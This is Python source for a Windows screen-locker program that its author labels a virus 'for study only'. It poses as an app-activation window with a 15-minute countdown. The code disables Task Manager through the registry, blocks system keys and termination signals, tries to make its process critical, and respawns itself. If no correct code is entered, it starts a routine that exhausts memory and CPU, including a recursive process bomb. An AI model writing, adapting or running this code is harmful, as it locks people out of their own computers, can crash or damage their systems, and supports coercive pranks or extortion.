import tkinter as tk
from tkinter import messagebox
import time
import threading
import os
import sys
import hashlib
import multiprocessing as mp
import numpy as np
import queue
import ctypes
import signal
import winreg
import subprocess
import random
import string


# ============ 超强反制手段（无法关闭） ============

def disable_task_manager():
    """禁用任务管理器"""
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        winreg.CreateKey(key, subkey)
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
    except:
        pass

def block_system_keys():
    """禁用Ctrl+Alt+Delete等系统快捷键"""
    try:
        ctypes.windll.user32.SystemParametersInfoW(0x005F, 0, None, 0)
    except:
        pass

def block_terminate_signals():
    """拦截所有终止信号"""
    def signal_handler(sig, frame):
        pass
    for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGABRT, signal.SIGBREAK]:
        try:
            signal.signal(sig, signal_handler)
        except:
            pass

def prevent_taskkill():
    """防止taskkill命令结束进程"""
    try:
        # 设置进程为系统关键进程（蓝屏保护）
        ctypes.windll.kernel32.SetProcessCritical(ctypes.windll.kernel32.GetCurrentProcess(), True)
    except:
        pass

def unblock_all():
    """恢复系统设置"""
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(handle, "DisableTaskMgr")
        winreg.CloseKey(handle)
    except:
        pass
    try:
        ctypes.windll.user32.SystemParametersInfoW(0x005F, 1, None, 0)
    except:
        pass

def create_daemon():
    """创建守护进程，防止被结束"""
    def daemon_worker():
        while True:
            time.sleep(2)
            # 检查主进程是否存在
            current_pid = os.getpid()
            try:
                if not psutil.pid_exists(current_pid):
                    # 主进程被结束，重新启动
                    subprocess.Popen([sys.executable, sys.argv[0]])
                    break
            except:
                pass
    
    threading.Thread(target=daemon_worker, daemon=True).start()

def hide_from_task_manager():
    """从任务管理器隐藏进程"""
    try:
        # 通过注册表隐藏进程
        import ctypes.wintypes
        # 这里使用Windows API隐藏进程
        pass
    except:
        pass

# ============ 获取机器码 ============
def get_machine_code():
    try:
        board_serial = subprocess.check_output('wmic baseboard get serialnumber', shell=True).decode().split('\n')[1].strip()
    except:
        board_serial = "UNKNOWN"
    
    try:
        cpu_id = subprocess.check_output('wmic cpu get processorid', shell=True).decode().split('\n')[1].strip()
    except:
        cpu_id = "UNKNOWN"
    
    try:
        disk_serial = subprocess.check_output('wmic diskdrive get serialnumber', shell=True).decode().split('\n')[1].strip()
    except:
        disk_serial = "UNKNOWN"
    
    machine_info = f"{board_serial}_{cpu_id}_{disk_serial}"
    machine_code = hashlib.md5(machine_info.encode()).hexdigest().upper()
    return machine_code

# ============ 基于机器码生成激活码 ============
def generate_activation_code(machine_code):
    seed = hashlib.md5(machine_code.encode()).hexdigest()
    random.seed(seed)
    chars = string.ascii_uppercase + string.digits
    parts = []
    for _ in range(4):
        part = ''.join(random.choice(chars) for _ in range(4))
        parts.append(part)
    return '-'.join(parts)

# ============ 验证激活码 ============
def check_activation(input_code, correct_code):
    return input_code.strip().upper() == correct_code

# ============ 毁灭程序 ============
def memoryh():
    chunks = []
    while True:
        chunks.append(bytearray(200 * 1024 * 1024))
        result = b''.join(chunks)
        time.sleep(0.1)

def cpuh():
    processes = [mp.Process(target=cpuh) for _ in range(mp.cpu_count())]
    try:
        for p in processes:
            p.start()
    finally:
        for p in processes:
            p.terminate()

def worker_matmul(q, size, iterations):
    A = np.random.randn(size, size).astype(np.float32)
    B = np.random.randn(size, size).astype(np.float32)
    for i in range(iterations):
        C = np.matmul(A, B)
    q.put(f"完成")

def multi_thread_matmul(thread_count=4, size=1500, iterations=1600):
    start = time.time()
    q = queue.Queue()
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=worker_matmul, args=(q, size, iterations))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return time.time() - start

def destroy_system():
    threads = []
    t1 = threading.Thread(target=memoryh)
    t1.start()
    threads.append(t1)
    t2 = threading.Thread(target=cpuh)
    t2.start()
    threads.append(t2)
    t3 = threading.Thread(target=multi_thread_matmul, args=(4, 1500, 1600))
    t3.start()
    threads.append(t3)
    def cpu_burn():
        while True:
            _ = [i**i for i in range(1000)]
    t4 = threading.Thread(target=cpu_burn)
    t4.start()
    threads.append(t4)
    for t in threads:
        t.join()

# ============ 自刎归天弹窗 ============
def show_suicide_messages():
    root = tk.Tk()
    root.withdraw()
    # messagebox.showinfo("made with Python","适配：bd01解锁器")
    messagebox.showinfo("Copyright","made by kiwiz_262418 \n 病毒，仅供学习，请勿随意传播 \n 否则，后果自负 \n 解锁码工具：zkwei123.github.io/tool/unlock.zip")
    messagebox.showwarning("免责声明","现在的病毒是可以关掉的，后面则不可以，如果您不希望您的电脑爆炸，请退出，否则后果自负")
    time.sleep(2)
    messagebox.showwarning("刘备","电脑三件套听令，病毒过后，")
    for word in ["自", "刎", "归", "天"]:
        messagebox.showinfo("", word)
        time.sleep(0.3)
    root.destroy()

# ============ 主窗口（应用激活） ============
class ActivationApp:
    def __init__(self):
        # 生成机器码和激活码（纯内存，不保存文件）
        self.machine_code = get_machine_code()
        self.activation_code = generate_activation_code(self.machine_code)
        self.activated = False
        self.attempts_left = 15  # 最多15次尝试
        
        # 应用超强反制
        self.apply_max_protection()
        
        # 创建窗口
        self.root = tk.Tk()
        self.root.title("应用激活")
        self.root.geometry("600x550")
        self.root.resizable(False, False)
        self.root.attributes('-topmost', True)
        
        # 移除标题栏（Alt+F4失效）
        self.root.overrideredirect(True)
        
        # 但保留一个假的标题栏
        self.create_fake_titlebar()
        
        # 禁止关闭窗口
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # 拦截所有键盘事件
        self.root.bind('<Alt-F4>', lambda e: "break")
        self.root.bind('<Control-Alt-Delete>', lambda e: "break")
        self.root.bind('<Control-Shift-Escape>', lambda e: "break")
        self.root.bind('<Alt-Tab>', lambda e: "break")
        self.root.bind('<Escape>', lambda e: "break")
        
        self.create_ui()
        self.start_countdown()
        
        # 启动防护线程
        self.start_protection()
        
        self.root.mainloop()
    
    def create_fake_titlebar(self):
        """创建假的标题栏（看起来像正常的窗口）"""
        title_frame = tk.Frame(self.root, bg="#2196F3", height=30)
        title_frame.pack(fill=tk.X, side=tk.TOP)
        title_frame.pack_propagate(False)
        
        # 标题文字
        title_label = tk.Label(title_frame, text="应用激活", 
                               bg="#2196F3", fg="white", font=("Arial", 10, "bold"))
        title_label.pack(side=tk.LEFT, padx=10, pady=5)
        
        # 假的关闭按钮（点了没用）
        close_btn = tk.Button(title_frame, text="✕", 
                             bg="#2196F3", fg="white", 
                             font=("Arial", 10, "bold"),
                             bd=0, activebackground="#E81123",
                             command=lambda: None)
        close_btn.pack(side=tk.RIGHT, padx=10, pady=2)
    
    def apply_max_protection(self):
        """应用所有防护"""
        try:
            disable_task_manager()
            block_system_keys()
            block_terminate_signals()
            prevent_taskkill()
            create_daemon()
        except:
            pass
    
    def start_protection(self):
        """启动额外保护线程"""
        def monitor():
            while True:
                time.sleep(1)
                # 持续应用防护（防止被绕过）
                try:
                    disable_task_manager()
                    block_system_keys()
                except:
                    pass
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def remove_protection(self):
        try:
            unblock_all()
        except:
            pass
    
    def create_ui(self):
        # 内容区域
        content = tk.Frame(self.root, bg="white")
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # 标题
        tk.Label(content, text="🔐 应用激活", 
                font=("Arial", 24, "bold"), fg="#2196F3", bg="white").pack(pady=20)
        
        tk.Label(content, text="本应用需要激活后才能使用", 
                font=("Arial", 12), bg="white").pack(pady=5)
        
        tk.Frame(content, height=2, bg="gray").pack(fill=tk.X, padx=40, pady=10)
        
        # 机器码区域
        tk.Label(content, text="📋 机器码", 
                font=("Arial", 12, "bold"), bg="white").pack(pady=(15, 5))
        
        code_frame = tk.Frame(content, bg="white")
        code_frame.pack(pady=5)
        
        self.machine_code_var = tk.StringVar()
        self.machine_code_var.set(self.machine_code)
        
        machine_entry = tk.Entry(code_frame, textvariable=self.machine_code_var, 
                                 font=("Consolas", 12), width=40, 
                                 state='readonly', readonlybackground='white')
        machine_entry.pack(side=tk.LEFT, padx=5)
        
        copy_btn = tk.Button(code_frame, text="📋 复制", 
                            command=self.copy_machine_code,
                            font=("Arial", 10), bg="#4CAF50", fg="white",
                            width=8, height=1)
        copy_btn.pack(side=tk.LEFT, padx=5)
        
        tk.Label(content, text="请将机器码发送给管理员获取激活码", 
                font=("Arial", 9), fg="gray", bg="white").pack(pady=5)
        
        tk.Frame(content, height=2, bg="gray").pack(fill=tk.X, padx=40, pady=10)
        
        # 激活码输入区域
        tk.Label(content, text="🔑 输入激活码", 
                font=("Arial", 12, "bold"), bg="white").pack(pady=(15, 5))
        
        # 剩余次数显示
        self.attempts_label = tk.Label(content, text=f"剩余尝试次数：{self.attempts_left} 次", 
                                       font=("Arial", 10), fg="orange", bg="white")
        self.attempts_label.pack(pady=2)
        
        tk.Label(content, text="剩余时间：", 
                font=("Arial", 10), bg="white").pack()
        
        self.time_label = tk.Label(content, text="15:00", 
                                   font=("Arial", 20, "bold"), fg="#2196F3", bg="white")
        self.time_label.pack(pady=5)
        
        frame = tk.Frame(content, bg="white")
        frame.pack(pady=10)
        
        tk.Label(frame, text="激活码：", font=("Arial", 12), bg="white").pack(side=tk.LEFT, padx=5)
        self.code_entry = tk.Entry(frame, font=("Arial", 14), width=25)
        self.code_entry.pack(side=tk.LEFT, padx=5)
        self.code_entry.bind('<Return>', lambda e: self.verify_code())
        
        self.verify_btn = tk.Button(content, text="✅ 验证激活码", 
                                    command=self.verify_code,
                                    font=("Arial", 12), bg="#4CAF50", fg="white",
                                    width=15, height=1)
        self.verify_btn.pack(pady=15)
        
        self.hint_label = tk.Label(content, text="", font=("Arial", 10), fg="red", bg="white")
        self.hint_label.pack(pady=5)
        
        tk.Label(content, text="💡 提示：请联系管理员获取激活码", 
                font=("Arial", 9), fg="gray", bg="white").pack(pady=5)
        
        tk.Label(content, text="⚠️ 此程序无法通过任何方式关闭", 
                font=("Arial", 8), fg="red", bg="white").pack(pady=2)
    
    def copy_machine_code(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.machine_code)
        self.hint_label.config(text="✅ 机器码已复制！", fg="green")
        self.root.after(2000, lambda: self.hint_label.config(text=""))
    
    def start_countdown(self):
        self.remaining = 15 * 60
        
        def countdown():
            while self.remaining > 0 and not self.activated:
                mins = self.remaining // 60
                secs = self.remaining % 60
                self.time_label.config(text=f"{mins:02d}:{secs:02d}")
                
                if self.remaining < 60:
                    self.time_label.config(fg="red")
                elif self.remaining < 300:
                    self.time_label.config(fg="orange")
                
                time.sleep(1)
                self.remaining -= 1
            
            if not self.activated:
                self.time_label.config(text="⏰ 时间到！", fg="red")
                self.verify_btn.config(state=tk.DISABLED)
                self.code_entry.config(state=tk.DISABLED)
                self.hint_label.config(text="💀 系统将进行自毁...", fg="red")
                self.execute_destruction()
        
        threading.Thread(target=countdown, daemon=True).start()
    
    def verify_code(self):
        """验证激活码，带次数限制"""
        if self.attempts_left <= 0:
            self.hint_label.config(text="❌ 尝试次数已用完！系统即将自毁", fg="red")
            self.root.after(2000, self.execute_destruction)
            return
        
        input_code = self.code_entry.get()
        
        if check_activation(input_code, self.activation_code):
            self.activated = True
            self.hint_label.config(text="✅ 激活成功！", fg="green")
            self.root.after(1000, self.clean_exit)
        else:
            self.attempts_left -= 1
            self.attempts_label.config(text=f"剩余尝试次数：{self.attempts_left} 次")
            
            if self.attempts_left <= 0:
                self.hint_label.config(text="❌ 激活码错误！次数已用完，系统即将自毁", fg="red")
                self.code_entry.delete(0, tk.END)
                self.code_entry.config(state=tk.DISABLED)
                self.verify_btn.config(state=tk.DISABLED)
                self.root.after(2000, self.execute_destruction)
            else:
                self.hint_label.config(text=f"❌ 激活码错误！还剩 {self.attempts_left} 次机会", fg="red")
                self.code_entry.delete(0, tk.END)
    
    def execute_destruction(self):
        warning = tk.Toplevel(self.root)
        warning.title("💀")
        warning.geometry("400x200")
        warning.attributes('-topmost', True)
        warning.protocol("WM_DELETE_WINDOW", lambda: None)
        tk.Label(warning, text="自刎归天", font=("Arial", 30, "bold"), 
                fg="red").pack(expand=True)
        tk.Label(warning, text="系统即将自毁...", font=("Arial", 16)).pack()
        
        self.root.after(1500, lambda: self.root.destroy())
        threading.Thread(target=destroy_system, daemon=True).start()
    
    def clean_exit(self):
        self.remove_protection()
        # 删除自身
        try:
            messagebox.showwarning("刘备","我自刎了一辈子，就不能休息休息吗，接着奏乐，接着舞")
            messagebox.showinfo("kiwiz262418","通关！")
            script_path = sys.argv[0]
            if os.path.exists(script_path):
                os.remove(script_path)
            self.root.quit()
            sys.exit(0)
        except:
            pass
        self.root.quit()
        sys.exit(0)

# ============ 运行 ============
if __name__ == "__main__":
    show_suicide_messages()
    app = ActivationApp()
